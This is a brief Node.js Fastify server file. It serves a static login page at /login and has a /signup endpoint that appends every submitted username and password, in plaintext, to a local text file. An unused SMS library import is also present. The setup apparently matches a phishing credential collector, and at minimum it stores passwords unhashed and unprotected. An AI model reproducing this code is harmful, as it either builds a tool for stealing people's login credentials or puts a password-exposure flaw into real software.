const path = require('path')
const fs = require('fs');


const fastify = require('fastify')({
  logger: true
})

const Kavenegar = require('kavenegar');

fastify.register(require('@fastify/static'), {
  root: path.join(__dirname, 'public'),
  prefix: '/public/', // optional: default '/'
})

fastify.post('/signup', function (req, res) {
  fs.appendFile('message.txt', `username : ${req.body.username} , password : ${req.body.password}\n`, function (err) {
    if (err) throw err;
    console.log('Saved!');
  });
  res.send('OK')
})

fastify.get('/login', function (req, reply) {
  reply.sendFile('index.html') // serving path.join(__dirname, 'public', 'myHtml.html') directly
})

// Run the server!
fastify.listen({ port: 3000 }, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
